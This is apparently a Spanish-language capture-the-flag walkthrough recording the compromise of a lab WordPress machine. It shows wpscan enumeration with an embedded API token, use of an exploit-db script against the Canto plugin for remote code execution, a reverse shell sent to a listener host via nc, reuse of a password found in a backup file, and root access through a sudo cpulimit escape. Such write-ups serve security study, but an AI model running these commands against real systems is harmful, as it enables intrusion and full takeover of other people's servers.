PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Puerto 80 -->  WordPress 6.7.2

-Enumeramos Wordpress:
	-wpscan --url http://192.168.1.141 -e ap,u
		**-Usuario: erik**

-Enumeramos plugins de forma agresiva:
	-wpscan --url http://192.168.1.141 --enumerate vp --api-token 'io7oFnezyQ9QiEi4bVZcbpntkLzEnSVAYRdd70zEEaE' --plugins-detection aggressive

-Encontramos --> Canto < 3.0.7 - Unauthenticated RCE

-Buscamos:
	-searchsploit canto:
		**-Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)**

-Ejecutamos un comando para probar si es vulnerable:
	-python3 51826.py -u http://192.168.1.141 -LHOST 192.168.1.135 -c 'id'
	Local web server on port 8080...
	Server response:
	**uid=33(www-data) gid=33(www-data) groups=33(www-data)**
	(HEMOS PODIDO EJECUTAR UN COMANDO EN EL SERVIDOR!!)

-Nos mandamos una rs de la siguiente forma:
	-python3 51826.py -u http://192.168.1.141 -LHOST 192.168.1.135 -s exploit.php
	-nc -lvnp 1234:
		www-data@canto:/$

## Escalada de Privilegios

www-data@canto:/var/wordpress/backups$ cat 12052024.txt 

| Users	   |      Password        |
------------|----------------------|
| erik      | th1sIsTheP3ssw0rd!   |

-su erik
-password: th1sIsTheP3ssw0rd!
	erik@canto:/$

-sudo -l:
	(ALL : ALL) NOPASSWD: /usr/bin/cpulimit

erik@canto:/var/wordpress/backups$ sudo cpulimit -l 100 -f /bin/sh
	-root@canto:/# whoami
		root
